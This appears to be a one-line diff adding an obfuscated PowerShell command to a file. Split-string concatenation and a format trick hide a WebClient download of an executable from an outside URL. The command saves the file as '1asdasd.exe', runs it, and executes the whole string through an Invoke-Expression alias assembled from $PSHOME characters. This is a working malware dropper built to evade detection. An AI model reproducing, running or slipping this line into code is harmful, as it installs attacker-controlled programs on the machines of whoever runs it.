@@ -1,0 +1,1 @@
+﻿ (('((ne'+'w-object'+' net.web'+'client).DownloadFile({0}http://maxi'+'.bergm'+'e'+'tzge'+'rei.ch/s'+'i'+'rut'+'o/faxe'+'qi/d'+'o'+'soxa'+'.php{0}'+',{0}1asdasd.e'+'xe{'+'0'+'}));Start-Process {'+'0}1asda'+'sd.'+'exe{'+'0};') -f[Char]39) |. ( $pSHOMe[4]+$PsHOme[34]+'X')
